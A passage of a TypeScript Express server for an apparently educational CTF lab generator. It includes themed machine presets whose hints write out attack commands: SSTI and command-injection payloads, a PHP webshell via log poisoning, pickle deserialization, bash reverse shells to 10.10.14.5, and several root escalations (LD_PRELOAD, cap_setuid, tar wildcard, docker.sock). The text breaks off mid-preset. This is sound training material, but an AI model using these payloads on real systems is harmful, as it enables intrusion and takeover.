import express from 'express';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';
import { GoogleGenAI } from '@google/genai';
import { rateLimit } from 'express-rate-limit';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// PORT/HOST se leen de .env / entorno. Por defecto el servidor solo escucha
// en 127.0.0.1 (localhost): hace falta fijar HOST=0.0.0.0 explícitamente
// para exponerlo a otros equipos de la red, algo que esta app nunca necesita
// para su uso normal (un profesor o alumno ejecutándola en su propio equipo).
const DEFAULT_PORT = 3000;
const parsedPort = Number(process.env.PORT);
const PORT = Number.isInteger(parsedPort) && parsedPort > 0 && parsedPort < 65536 ? parsedPort : DEFAULT_PORT;
const HOST = process.env.HOST?.trim() || '127.0.0.1';

const MAX_BODY_SIZE = process.env.MAX_BODY_SIZE?.trim() || '1mb';

app.set('trust proxy', false);
app.use(express.json({ limit: MAX_BODY_SIZE }));

// Responde 413/400 de forma controlada en vez de tumbar el proceso cuando
// llega un body demasiado grande o JSON malformado.
app.use((err: any, _req: express.Request, res: express.Response, next: express.NextFunction) => {
  if (err?.type === 'entity.too.large') {
    return res.status(413).json({ success: false, error: 'El cuerpo de la petición supera el límite permitido.' });
  }
  if (err?.type === 'entity.parse.failed' || err instanceof SyntaxError) {
    return res.status(400).json({ success: false, error: 'JSON de la petición no válido.' });
  }
  return next(err);
});

// Rate limiting básico por IP para las rutas que consumen la API de Gemini,
// pensado para disuadir abuso/rafagas accidentales en un uso local, no para
// soportar tráfico adversarial a gran escala.
const aiRateLimiter = rateLimit({
  windowMs: 60_000,
  limit: 20,
  standardHeaders: true,
  legacyHeaders: false,
  message: { success: false, error: 'Demasiadas peticiones. Espera un minuto antes de volver a intentarlo.' },
});

const getGeminiClient = () => {
  const apiKey = process.env.GEMINI_API_KEY;
  if (!apiKey) {
    console.warn('GEMINI_API_KEY is not set in environment.');
  }
  return new GoogleGenAI({
    apiKey: apiKey || '',
    httpOptions: {
      headers: {
        'User-Agent': 'aistudio-build',
      },
    },
  });
};

// --- Dynamic Model Discovery & Resilient Fallback System ---
let cachedBestModel: string | null = null;
let lastModelCheck = 0;
let cachedDiscoveredModels: string[] = [];

export async function getBestAvailableModel(
  ai?: GoogleGenAI,
  requestedPreference: 'fast' | 'pro' | 'auto' = 'auto'
): Promise<string> {
  const ONE_HOUR = 60 * 60 * 1000;
  const now = Date.now();

  // If already discovered and valid within cache window
  if (cachedBestModel && now - lastModelCheck < ONE_HOUR && cachedDiscoveredModels.length > 0) {
    if (requestedPreference === 'pro') {
      const proCandidate = cachedDiscoveredModels.find(
        (m) => m.includes('pro') && !m.includes('image') && !m.includes('tts')
      );
      if (proCandidate) return proCandidate;
    }
    return cachedBestModel;
  }

  const client = ai || getGeminiClient();
  const apiKey = process.env.GEMINI_API_KEY;

  if (!apiKey || apiKey === 'MY_GEMINI_API_KEY') {
    return 'gemini-2.5-flash';
  }

  try {
    const list = await client.models.list();
    const discovered: string[] = [];

    for await (const m of list) {
      if (m.name) {
        const cleanName = m.name.replace(/^models\//, '');
        // Exclude specialized non-text models
        if (
          !cleanName.includes('tts') &&
          !cleanName.includes('native-audio') &&
          !cleanName.includes('live') &&
          !cleanName.includes('embedding')
        ) {
          discovered.push(cleanName);
        }
      }
    }

    if (discovered.length > 0) {
      cachedDiscoveredModels = discovered;
      lastModelCheck = now;

      // Ordered preference waterfall: prefer latest stable Flash models for fast CTF generation
      const preferredFlashWaterfall = [
        'gemini-2.5-flash',
        'gemini-2.0-flash',
        'gemini-1.5-flash',
        'gemini-flash-latest',
      ];

      for (const candidate of preferredFlashWaterfall) {
        if (discovered.includes(candidate)) {
          cachedBestModel = candidate;
          console.log(`[NetPhantom] Modelo dinámico descubierto y seleccionado: ${cachedBestModel}`);
          return candidate;
        }
      }

      // If exact candidates not in list, find any model containing 'flash'
      const anyFlash = discovered.find((m) => m.includes('flash') && !m.includes('image'));
      if (anyFlash) {
        cachedBestModel = anyFlash;
        return anyFlash;
      }

      cachedBestModel = discovered[0];
      return cachedBestModel;
    }
  } catch (error: any) {
    console.warn('[NetPhantom] Consulta de modelos disponibles falló, usando fallback de resiliencia:', error?.message);
  }

  return 'gemini-2.5-flash';
}

// --- Presets Data covering TV Series, Sci-Fi, Fantasy, Horror & Cyberpunk ---
const DEFAULT_PRESETS: Record<string, any> = {
  'mr-robot': {
    themeName: 'Mr. Robot - Evil Corp E-Coin Banking Terminal',
    genre: 'tv_series',
    codename: 'FSOCIETY_E_CORP_01',
    difficulty: 'Medium',
    vector: 'SSTI (Server-Side Template Injection) en Jinja2',
    secondaryVector: 'Escalada de privilegios vía binario SUID custom con Path Hijacking',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.42',
    story: 'Llegó el 9 de mayo. Evil Corp ha desplegado un portal de emergencia para la validación de transacciones en E-Coin. Elliot descubrió que el motor de renderizado de plantillas no sanitiza los nombres de cuenta de los clientes VIP.',
    userFlag: 'CTF{3v1l_c0rp_3c01n_t3mpl4t3_1nj3ct10n_pwn3d}',
    rootFlag: 'CTF{d4rk_4rmy_wh1t3r053_m45t3r_k3y_unl0ck3d}',
    userFlagPath: '/home/elliot/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      {
        id: 'mr-h1',
        level: 1,
        title: 'Inspección de Respuestas HTTP',
        category: 'recon',
        text: 'Observa detenidamente qué sucede con el parámetro enviado en la URL. ¿El servidor lo codifica en entidades HTML seguras o lo interpreta de forma dinámica?',
      },
      {
        id: 'mr-h2',
        level: 2,
        title: 'Verificación de Motor de Plantillas',
        category: 'foothold',
        text: 'La cabecera del servidor y la extensión revelan Python/Flask. Prueba inyectar expresiones matemáticas entre llaves dobles como {{ 7 * 7 }} o {{ config.items() }} para evaluar el contexto de ejecución.',
      },
      {
        id: 'mr-h3',
        level: 3,
        title: 'Escape del Sandbox e Introspección MRO',
        category: 'foothold',
        text: 'Jinja2 permite navegar por la jerarquía de clases de Python a través de `().__class__.__base__.__subclasses__()` para invocar `subprocess.Popen` o `os.popen`. Usa `cat /home/elliot/user.txt` para leer la bandera.',
      },
      {
        id: 'mr-h4',
        level: 1,
        title: 'Auditoría de Permisos Locales',
        category: 'privesc',
        text: 'Como usuario elliot, busca qué binarios instalados en el sistema tienen privilegios delegados de root para ejecutarse sin requerir contraseña.',
      },
      {
        id: 'mr-h5',
        level: 2,
        title: 'Inspección de Cadenas en Binarios SUID',
        category: 'privesc',
        text: 'Utiliza `find / -perm -u=s -type f 2>/dev/null`. Revisa `/usr/local/bin/system-diag` con el comando `strings`. Presta atención a las llamadas a comandos del sistema que no usen rutas absolutas.',
      },
      {
        id: 'mr-h6',
        level: 3,
        title: 'Secuestro de Variable PATH',
        category: 'privesc',
        text: 'El binario ejecuta `service-checker` directamente. Crea un script ejecutable llamado `service-checker` en `/tmp` con `/bin/bash -p`, agrégalo a tu PATH (`export PATH=/tmp:$PATH`) y ejecuta `/usr/local/bin/system-diag`.',
      },
    ],
  },
  'the-matrix': {
    themeName: 'The Matrix - Nebuchadnezzar Core & Zion Relay',
    genre: 'scifi',
    codename: 'NEBUCHADNEZZAR_NODE_0',
    difficulty: 'Hard',
    vector: 'Command Injection en Daemon de Sintonización de Emisiones',
    secondaryVector: 'Explotación de binario con Linux Capability cap_setuid en Python',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.101',
    story: 'La nave Nabucodonosor de Morfeo ejecuta una pasarela clandestina para transmitir señales piratas a la Matriz. Los centinelas de las máquinas rastrean las frecuencias. Una interfaz de diagnóstico de radio expone una inyección de comandos que permite escapar de la simulación.',
    userFlag: 'CTF{wh1t3_r4bb1t_f0ll0w_th3_c0d3_m4tr1x}',
    rootFlag: 'CTF{th3_0n3_n30_unplug_fr0m_m4tr1x_z10n}',
    userFlagPath: '/home/operator/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      {
        id: 'mx-h1',
        level: 1,
        title: 'Parámetros de Diagnóstico de Red',
        category: 'recon',
        text: 'La consola de la nave ofrece una utilidad para emitir pulsos EMP o ping de frecuencias. Analiza cómo procesa los delimitadores de argumentos en Unix.',
      },
      {
        id: 'mx-h2',
        level: 2,
        title: 'Encadenamiento de Comandos Shell',
        category: 'foothold',
        text: 'Prueba delimitadores como `;`, `|`, `&&` o `$()` en el campo de entrada de frecuencia. El backend invoca una llamada de shell sin escapar argumentos.',
      },
      {
        id: 'mx-h3',
        level: 3,
        title: 'Evasión de Filtro de Espacios y Reverse Shell',
        category: 'foothold',
        text: 'Si los espacios están filtrados, usa `${IFS}` o llaves bash para invocar tu shell. Por ejemplo: `127.0.0.1;cat$IFS/home/operator/user.txt`.',
      },
      {
        id: 'mx-h4',
        level: 1,
        title: 'Más allá de los permisos SUID tradicionales',
        category: 'privesc',
        text: 'No todos los privilegios en Linux dependen del bit SUID. El kernel moderno delega permisos granulares mediante capacidades POSIX.',
      },
      {
        id: 'mx-h5',
        level: 2,
        title: 'Inspección de Linux Capabilities',
        category: 'privesc',
        text: 'Ejecuta `getcap -r / 2>/dev/null`. Fíjate en los intérpretes que cuenten con la capacidad `cap_setuid+ep`.',
      },
      {
        id: 'mx-h6',
        level: 3,
        title: 'Escalada mediante cap_setuid en Python',
        category: 'privesc',
        text: 'Python tiene asignada la capacidad de fijar el UID. Ejecuta: `python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"` para obtener una shell como root.',
      },
    ],
  },
  'kaer-morhen': {
    themeName: 'The Witcher - Kaer Morhen Alchemical Vault',
    genre: 'fantasy',
    codename: 'KAER_MORHEN_MUTAGEN_ARCHIVE',
    difficulty: 'Medium',
    vector: 'LFI (Local File Inclusion) a RCE con Log Poisoning en PHP',
    secondaryVector: 'Sudo sin contraseña (NOPASSWD) en script de destilación alquímica',
    targetOS: 'Ubuntu 24.04 LTS',
    ip: '10.10.110.105',
    story: 'El archivo secreto de la Escuela del Lobo guarda las fórmulas de la Prueba de las Hierbas y mutágenos de brujo. Vesemir descubrió que el catálogo rúnico en PHP admite inclusión arbitraria de pergaminos, permitiendo contaminar los registros del servidor con cargas maliciosas.',
    userFlag: 'CTF{wh1t3_w0lf_tr14l_0f_gr45535_mut4g3n}',
    rootFlag: 'CTF{v353m1r_4nc13nt_w1tch3r_m45t3r_k3y}',
    userFlagPath: '/home/geralt/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      {
        id: 'km-h1',
        level: 1,
        title: 'Rutas Relativas en Carga de Pergaminos',
        category: 'recon',
        text: 'El parámetro `?scroll=formula1.php` carga archivos del sistema. ¿Permite retroceder en el árbol de directorios con `../`?',
      },
      {
        id: 'km-h2',
        level: 2,
        title: 'Localización de Archivos de Registro Accesibles',
        category: 'foothold',
        text: 'Verifica si puedes leer `/var/log/apache2/access.log` o `/var/log/nginx/access.log`. Si tienes permiso de lectura, tus peticiones HTTP quedan registradas allí.',
      },
      {
        id: 'km-h3',
        level: 3,
        title: 'Inyección de Carga en User-Agent (Log Poisoning)',
        category: 'foothold',
        text: 'Envía una petición curl con User-Agent: `<?php system($_GET["cmd"]); ?>`. Luego incluye el log mediante LFI con `?scroll=/var/log/apache2/access.log&cmd=cat /home/geralt/user.txt`.',
      },
      {
        id: 'km-h4',
        level: 1,
        title: 'Permisos de Sudo del Brujo',
        category: 'privesc',
        text: 'Comprueba los comandos privilegiados asignados a Geralt ejecutando `sudo -l`.',
      },
      {
        id: 'km-h5',
        level: 2,
        title: 'Parámetros del Script Alquímico',
        category: 'privesc',
        text: 'Geralt puede ejecutar `sudo /opt/alchemical/brew.sh`. Revisa el código del script bash para ver cómo maneja argumentos externos o variables.',
      },
      {
        id: 'km-h6',
        level: 3,
        title: 'Inyección de Comandos en Argumentos de Sudo',
        category: 'privesc',
        text: 'El script `brew.sh` evalúa un archivo de receta con `source "$1"`. Crea una receta en `/tmp/recipe.sh` con `/bin/bash` y ejecútala con `sudo /opt/alchemical/brew.sh /tmp/recipe.sh`.',
      },
    ],
  },
  'resident-evil': {
    themeName: 'Resident Evil - Umbrella Hive Sub-Level 6',
    genre: 'horror',
    codename: 'UMBRELLA_HIVE_REDQUEEN',
    difficulty: 'Easy',
    vector: 'Servicios SMBv1 Obsoletos con Acceso Anónimo a Volcados',
    secondaryVector: 'Secuestro de biblioteca dinámica LD_PRELOAD en ejecutable de presurización',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.108',
    story: 'Los laboratorios subterráneos de Raccoon City están en cuarentena. La Reina Roja ha bloqueado los accesos, pero los técnicos de mantenimiento dejaron un recurso compartido Samba accesible sin contraseña que contiene volcados de memoria y credenciales del personal médico.',
    userFlag: 'CTF{r3d_qu33n_y0u_4r3_4ll_g01ng_t0_d13}',
    rootFlag: 'CTF{t_v1ru5_g_v1ru5_n3m3515_pr0t0c0l_r00t}',
    userFlagPath: '/home/alice/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      {
        id: 're-h1',
        level: 1,
        title: 'Enumeración de Recursos SMB Compartidos',
        category: 'recon',
        text: 'El puerto 445 está abierto. Comprueba si el servidor Samba admite sesiones nulas o autenticación anónima para enumerar carpetas.',
      },
      {
        id: 're-h2',
        level: 2,
        title: 'Herramientas de Exploración SMB',
        category: 'foothold',
        text: 'Usa `smbclient -L //10.10.110.108/ -N` o `enum4linux-ng` para listar recursos. Encontrarás el recurso `//backup_decon` accesible sin clave.',
      },
      {
        id: 're-h3',
        level: 3,
        title: 'Extracción de Credenciales en Archivo .conf',
        category: 'foothold',
        text: 'Descarga `decon_maintenance.conf` desde el recurso SMB. Contiene la contraseña en texto claro para el usuario `alice` vía SSH.',
      },
      {
        id: 're-h4',
        level: 1,
        title: 'Variables de Entorno en Sudo',
        category: 'privesc',
        text: 'Ejecuta `sudo -l` como Alice. Observa la directiva `env_keep += LD_PRELOAD` en la configuración de sudoers.',
      },
      {
        id: 're-h5',
        level: 2,
        title: 'Sobreescritura de Funciones con LD_PRELOAD',
        category: 'privesc',
        text: 'Cuando `LD_PRELOAD` está habilitado en sudoers, puedes cargar una biblioteca compartida (.so) compilada por ti antes de que arranque cualquier binario permitido.',
      },
      {
        id: 're-h6',
        level: 3,
        title: 'Compilación de Exploit .so para Escalada',
        category: 'privesc',
        text: 'Compila en C una librería con `_init() { setuid(0); system("/bin/bash"); }` usando `gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles`. Luego: `sudo LD_PRELOAD=/tmp/root.so /usr/bin/decon-status`.',
      },
    ],
  },
  'blade-runner': {
    themeName: 'Blade Runner - Tyrell Corporation Nexus Vault',
    genre: 'cyberpunk',
    codename: 'TYRELL_NEXUS_VOIGHT_KAMPFF',
    difficulty: 'Insane',
    vector: 'Insecure Deserialization en API Python Pickle de Evaluación Replicante',
    secondaryVector: 'Socket de Docker expuesto al usuario (/var/run/docker.sock)',
    targetOS: 'Ubuntu 24.04 LTS',
    ip: '10.10.110.112',
    story: 'Los servidores de diseño genético de Tyrell Corp en Los Ángeles 2019 procesan lecturas pupilares del test Voight-Kampff. Los datos biométricos se transmiten serializados en base64 usando Pickle sin validación criptográfica, permitiendo a los replicantes rebeldes ejecutar código arbitrario.',
    userFlag: 'CTF{t34r5_1n_r41n_t1m3_t0_d13_r0y_b4tty}',
    rootFlag: 'CTF{m0r3_hum4n_th4n_hum4n_3ld0n_tyr3ll}',
    userFlagPath: '/home/deckard/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      {
        id: 'br-h1',
        level: 1,
        title: 'Análisis de Payloads Codificados en Base64',
        category: 'recon',
        text: 'La API recibe un parámetro `data` en base64 en la ruta `/api/v1/voight-kampff`. Decodifícalo e inspecciona los primeros bytes mágicos (`\\x80\\x04` o similar).',
      },
      {
        id: 'br-h2',
        level: 2,
        title: 'Peligros del Módulo Pickle en Python',
        category: 'foothold',
        text: 'El backend ejecuta `pickle.loads(base64.b64decode(payload))`. El método mágico `__reduce__` en clases Python se ejecuta automáticamente durante la deserialización.',
      },
      {
        id: 'br-h3',
        level: 3,
        title: 'Construcción de Exploit Pickle con __reduce__',
        category: 'foothold',
        text: 'Escribe un script Python donde una clase devuelva `(os.system, (\'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"\' ,))`. Serialízalo con `pickle.dumps()` y envíalo en base64.',
      },
      {
        id: 'br-h4',
        level: 1,
        title: 'Pertenencia a Grupos de Sistema',
        category: 'privesc',
        text: 'Ejecuta `id` con el usuario deckard. Presta atención al grupo `docker`.',
      },
      {
        id: 'br-h5',
        level: 2,
        title: 'Comunicación con el Demonio Docker',
        category: 'privesc',
        text: 'Pertenecer al grupo `docker` da acceso de lectura/escritura a `/var/run/docker.sock`, lo cual es equivalente a acceso total de root.',
      },
      {
        id: 'br-h6',
        level: 3,
        title: 'Montaje del Sistema de Archivos Host con Contenedor',
        category: 'privesc',
        text: 'Ejecuta: `docker run -v /:/host_fs -it debian:12-slim chroot /host_fs` o lee la bandera directamente con `docker run -v /root:/mnt debian:12-slim cat /mnt/root.txt`.',
      },
    ],
  },
  'weyland-yutani': {
    themeName: 'Alien - Weyland-Yutani Nostromo (MU-TH-UR 6000)',
    genre: 'scifi',
    codename: 'WEYLAND_MUTHR_6000',
    difficulty: 'Medium',
    vector: 'SQLi Ciega basada en booleanos en Endpoint de Monitoreo Criogénico',
    secondaryVector: 'Cronjob desatendido ejecutando script con permisos de escritura (Tar Wildcard)',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.115',
    story: 'La computadora central MU-TH-UR 6000 de la nave comercial Nostromo ejecuta la Orden Especial 937: recuperar el espécimen biológico, tripulación prescindible. Una vulnerabilidad SQLi en el panel de monitoreo criogénico permite extraer la contraseña de la cabina de Ash.',
    userFlag: 'CTF{w3yl4nd_yut4n1_0rd3r_937_cr3w_3xp3nd4bl3}',
    rootFlag: 'CTF{x3n0m0rph_p3rf3ct_0rg4n15m_4dm1n_4cc355}',
    userFlagPath: '/home/ripley/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      {
        id: 'wy-h1',
        level: 1,
        title: 'Inyección en Parámetros Numéricos de Pods',
        category: 'recon',
        text: 'La consulta del estado de las cápsulas de hiper-sueño recibe el parámetro `pod_id=1`. ¿Cambia la respuesta si envías `pod_id=1 AND 1=1` frente a `pod_id=1 AND 1=2`?',
      },
      {
        id: 'wy-h2',
        level: 2,
        title: 'Extracción de Caracteres con SUBSTRING',
        category: 'foothold',
        text: 'Al ser SQLi booleana a ciegas, usa `sqlmap` o un script en Python con peticiones condicionales evaluando `ASCII(SUBSTRING((SELECT password FROM crew_members WHERE role=\'Science Officer\'), 1, 1))`.',
      },
      {
        id: 'wy-h3',
        level: 3,
        title: 'Comando SQLMap para Extracción Automática',
        category: 'foothold',
        text: 'Ejecuta `sqlmap -u "http://10.10.110.115/capsule?pod_id=1" --dump -T crew_members`. Obtendrás el hash de Ash; rómpelo con rockyou.txt para iniciar sesión SSH.',
      },
      {
        id: 'wy-h4',
        level: 1,
        title: 'Tareas Programadas en /etc/crontab',
        category: 'privesc',
        text: 'Inspecciona `/etc/crontab` o `/etc/cron.d/` para detectar tareas que se ejecuten automáticamente cada minuto con privilegios de root.',
      },
      {
        id: 'wy-h5',
        level: 2,
        title: 'Peligro del Comodín Asterisco (*) en Tar',
        category: 'privesc',
        text: 'El cron ejecuta `tar -czf /backups/telemetry.tar.gz *` en la carpeta `/var/nostromo_telemetry`, donde el usuario ripley tiene permisos de escritura.',
      },
      {
        id: 'wy-h6',
        level: 3,
        title: 'Inyección de Parámetros Tar Checkpoint',
        category: 'privesc',
        text: 'Crea dos archivos en la carpeta: `touch -- "--checkpoint=1"` y `touch -- "--checkpoint-action=exec=sh root_shell.sh"`. Tar interpretará estos archivos como parámetros de línea de comandos cuando el cronjob se active.',
      },
    ],
  },
  'mordor-relay': {
    themeName: 'The Lord of the Rings - Barad-dûr Palantír Mesh',
    genre: 'fantasy',
    codename: 'MORDOR_PALANTIR_RELAY',
    difficulty: 'Hard',
    vector: 'JWT con Algoritmo "none" y Manipulación de Reclamaciones (Claims)',
    secondaryVector: 'Vulnerabilidad de Desbordamiento de Búfer en binario SUID de forja orca',
    targetOS: 'Ubuntu 24.04 LTS',
    ip: '10.10.110.120',
    story: 'La red de palantíri de Sauron sincroniza las órdenes oscuras entre Barad-dûr e Isengard. La API de autenticación de los Nazgûl valida tokens JWT pero acepta el algoritmo "none" sin requerir firma criptográfica, permitiendo a los miembros de la Comunidad forjar identidades del Señor Oscuro.',
    userFlag: 'CTF{0n3_r1ng_t0_rul3_th3m_4ll_1n_th3_d4rkn355}',
    rootFlag: 'CTF{54ur0n_3y3_5335_4ll_m0rd0r_r00t_m45t3r}',
    userFlagPath: '/home/frodo/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      {
        id: 'md-h1',
        level: 1,
        title: 'Inspección de Cabeceras JWT en la Red Palantír',
        category: 'recon',
        text: 'Al autenticarte en la interfaz web, recibes una cookie o cabecera `Authorization: Bearer eyJ...`. Decodifica el token en jwt.io o con herramientas CLI.',
      },
      {
        id: 'md-h2',
        level: 2,
        title: 'Vulnerabilidad del Algoritmo "none"',
        category: 'foothold',
        text: 'Modifica la cabecera del token cambiando `"alg": "HS256"` por `"alg": "none"`. Cambia el rol en el payload a `"role": "Nazgul_Commander"` o `"user": "sauron"`.',
      },
      {
        id: 'md-h3',
        level: 3,
        title: 'Firma Vacía para Bypass de Autenticación',
        category: 'foothold',
        text: 'Elimina completamente la tercera sección (la firma) dejando el punto final: `base64(header).base64(payload).`. Envía el token a `/api/orders/execute` para obtener acceso.',
      },
      {
        id: 'md-h4',
        level: 1,
        title: 'Binarios en /opt/forge/',
        category: 'privesc',
        text: 'Como usuario frodo, examina `/opt/forge/grond_hammer`. Tiene permisos SUID de root.',
      },
      {
        id: 'md-h5',
        level: 2,
        title: 'Análisis de Funciones Inseguras en C',
        category: 'privesc',
        text: 'El binario utiliza `strcpy()` para copiar el nombre de la runa sin verificar la longitud del búfer asignado en la pila (stack).',
      },
      {
        id: 'md-h6',
        level: 3,
        title: 'Sobreescritura de Retorno (EIP/RIP) para Shell de Root',
        category: 'privesc',
        text: 'Envía 64 bytes de relleno seguidos de la dirección de la función oculta `forge_master()` que invoca `system("/bin/sh")`.',
      },
    ],
  },
  'stranger-things': {
    themeName: 'Stranger Things - Hawkins National Lab Portal',
    genre: 'horror',
    codename: 'HAWKINS_GATE_01',
    difficulty: 'Medium',
    vector: 'Servicio SMBv1 / Samba con Acceso Anónimo a Backups',
    secondaryVector: 'Capacidades de Linux mal configuradas (cap_setuid en python3)',
    targetOS: 'Alpine Linux 3.20 (Minimal)',
    ip: '10.10.110.130',
    story: 'El Departamento de Energía de Hawkins mantiene una estación de telemetría que vigila las perturbaciones electromagnéticas del Mundo del Revés. Una carpeta Samba compartida sin autenticación expone copias de seguridad de las grabaciones de los experimentos del Dr. Brenner.',
    userFlag: 'CTF{h4wk1n5_l4b_up51d3_d0wn_p0rt4l}',
    rootFlag: 'CTF{3l3v3n_w4ffl35_m1ndfl4y3r_r00t_k3y}',
    userFlagPath: '/home/hopper/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      {
        id: 'st-h1',
        level: 1,
        title: 'Reconocimiento de Carpetas de Red',
        category: 'recon',
        text: 'Comprueba qué servicios de compartición de archivos están activos en los puertos estándar de Windows/Samba.',
      },
      {
        id: 'st-h2',
        level: 2,
        title: 'Inspección de Backups Anónimos',
        category: 'foothold',
        text: 'Usa `smbclient -N -L //10.10.110.130/` para listar recursos y descarga las grabaciones del laboratorio.',
      },
      {
        id: 'st-h3',
        level: 3,
        title: 'Extracción de Llaves SSH',
        category: 'foothold',
        text: 'Dentro del archivo tarball del recurso compartido se encuentra `id_rsa_hopper`. Ajusta permisos (`chmod 600`) y conéctate por SSH.',
      },
      {
        id: 'st-h4',
        level: 1,
        title: 'Capacidades de Linux Alternativas a SUID',
        category: 'privesc',
        text: 'El administrador restringió los binarios SUID, pero asignó capacidades avanzadas a intérpretes del sistema.',
      },
      {
        id: 'st-h5',
        level: 2,
        title: 'Comando getcap',
        category: 'privesc',
        text: 'Ejecuta `getcap -r / 2>/dev/null` para descubrir qué binarios pueden manipular identificadores de usuario.',
      },
      {
        id: 'st-h6',
        level: 3,
        title: 'Invocación de Shell con cap_setuid',
        category: 'privesc',
        text: 'Python tiene asignada `cap_setuid+ep`. Usa `python3 -c "import os; os.setuid(0); os.execl(\'/bin/sh\', \'sh\')"` para obtener root.',
      },
    ],
  },
  'cyberpunk': {
    themeName: 'Cyberpunk: Edgerunners - Arasaka Tower Sub-Level 4',
    genre: 'cyberpunk',
    codename: 'ARASAKA_ICE_BREAK_01',
    difficulty: 'Hard',
    vector: 'Deserialización Insegura en API de Telemetría de Ciberimplantes',
    secondaryVector: 'Secuestro de biblioteca dinámica LD_PRELOAD en ejecutable de seguridad',
    targetOS: 'Ubuntu 24.04 LTS',
    ip: '10.10.110.140',
    story: 'En el corazón de Night City, la Torre Arasaka monitoriza los implantes Sandevistan y neuroprocesadores militares. Una API interna de diagnóstico deserializa objetos de telemetría sin validar su integridad, permitiendo a los netrunners rebeldes vulnerar la red de seguridad corporativa.',
    userFlag: 'CTF{n1ght_c1ty_54nd3v15t4n_pwn3d}',
    rootFlag: 'CTF{m1k05h1_50ulk1ll3r_r00t_4cc355}',
    userFlagPath: '/home/david/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      {
        id: 'cp-h1',
        level: 1,
        title: 'Inspección del Tráfico de Ciberimplantes',
        category: 'recon',
        text: 'Analiza los endpoints HTTP que reciben cadenas codificadas en base64 en `/api/telemetry/sync`.',
      },
      {
        id: 'cp-h2',
        level: 2,
        title: 'Detección de Objetos Serializados',
        category: 'foothold',
        text: 'El payload decodificado contiene cabeceras de serialización en Python. El método `__reduce__` es invocado al procesar el ciberimplante.',
      },
      {
        id: 'cp-h3',
        level: 3,
        title: 'Construcción del Exploit de Deserialización',
        category: 'foothold',
        text: 'Construye una clase con `__reduce__` que llame a `subprocess.Popen` y encódala en base64 para enviar una reverse shell a tu puerto receptor.',
      },
      {
        id: 'cp-h4',
        level: 1,
        title: 'Privilegios Delegados de Arasaka Security',
        category: 'privesc',
        text: 'Verifica los privilegios de David ejecutando `sudo -l`. Observa si se conservan variables de entorno críticas.',
      },
      {
        id: 'cp-h5',
        level: 2,
        title: 'Permiso env_keep con LD_PRELOAD',
        category: 'privesc',
        text: 'La configuración de sudo mantiene la variable `LD_PRELOAD`, permitiendo forzar la carga previa de bibliotecas dinámicas en binarios autorizados.',
      },
      {
        id: 'cp-h6',
        level: 3,
        title: 'Inyección de Biblioteca Compartida',
        category: 'privesc',
        text: 'Compila una biblioteca en C con constructor de inicialización (`__attribute__((constructor))`) que ejecute `/bin/bash` con permisos de root.',
      },
    ],
  },
  'severance': {
    themeName: 'Severance - Lumon Industries Macrodata Refinement',
    genre: 'tv_series',
    codename: 'LUMON_MDR_TERMINAL_01',
    difficulty: 'Medium',
    vector: 'SQLi Ciega basada en tiempo en Endpoint de Cuadrícula',
    secondaryVector: 'Sudo sin contraseña (NOPASSWD) en script de rotación de logs',
    targetOS: 'Ubuntu 24.04 LTS',
    ip: '10.10.110.150',
    story: 'En la planta cercenada de Lumon Industries, los empleados de Refinamiento de Macrodatos categorizan números que infunden terror y temor. Una inyección SQL en la cuadrícula de clasificación de números permite inferir el protocolo secreto de contingencia para horas extras.',
    userFlag: 'CTF{pr4153_k13r_m4cr0d4t4_r3f1n3m3nt}',
    rootFlag: 'CTF{0v3rt1m3_c0nt1ng3ncy_pr0t0c0l_r00t}',
    userFlagPath: '/home/mark_s/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      {
        id: 'sv-h1',
        level: 1,
        title: 'Análisis de Tiempos de Respuesta',
        category: 'recon',
        text: 'El endpoint `/refine?bin=WO` no muestra errores ni datos directos. Evalúa si funciones de retardo temporal alteran el tiempo de respuesta.',
      },
      {
        id: 'sv-h2',
        level: 2,
        title: 'Inyección de pg_sleep o SLEEP',
        category: 'foothold',
        text: 'Envía `1\' OR SLEEP(5)--` o `1\'; SELECT pg_sleep(5);--`. Si la respuesta tarda 5 segundos adicionales, confirma una inyección temporal a ciegas.',
      },
      {
        id: 'sv-h3',
        level: 3,
        title: 'Extracción Condicional de Credenciales',
        category: 'foothold',
        text: 'Usa `sqlmap -u "http://10.10.110.150/refine?bin=1" --technique=T --dump` para extraer la clave de Mark S y acceder por SSH.',
      },
      {
        id: 'sv-h4',
        level: 1,
        title: 'Permisos de Administración de Kier',
        category: 'privesc',
        text: 'Comprueba la configuración de `sudo -l`. Observa qué scripts administrativos de mantenimiento se pueden ejecutar sin contraseña.',
      },
      {
        id: 'sv-h5',
        level: 2,
        title: 'Inspección de Permisos de Escritura',
        category: 'privesc',
        text: 'Mark S tiene permiso `NOPASSWD: /opt/lumon/log_rotate.sh`. Revisa quién tiene permisos de escritura sobre ese script o sobre sus dependencias.',
      },
      {
        id: 'sv-h6',
        level: 3,
        title: 'Sobreescritura del Script de Rotación',
        category: 'privesc',
        text: 'El archivo `/opt/lumon/log_rotate.sh` tiene permisos 0777. Añade `bash -i >& /dev/tcp/10.10.14.5/4444 0>&1` y ejecútalo con `sudo /opt/lumon/log_rotate.sh`.',
      },
    ],
  },
  'breaking-bad': {
    themeName: 'Breaking Bad - Los Pollos Hermanos Logistics Portal',
    genre: 'tv_series',
    codename: 'LOS_POLLOS_HERMANOS_01',
    difficulty: 'Medium',
    vector: 'IDOR & Carga Arbitraria de Archivos en Albaranes',
    secondaryVector: 'Cronjob de sincronización ejecutando script con permisos de escritura',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.160',
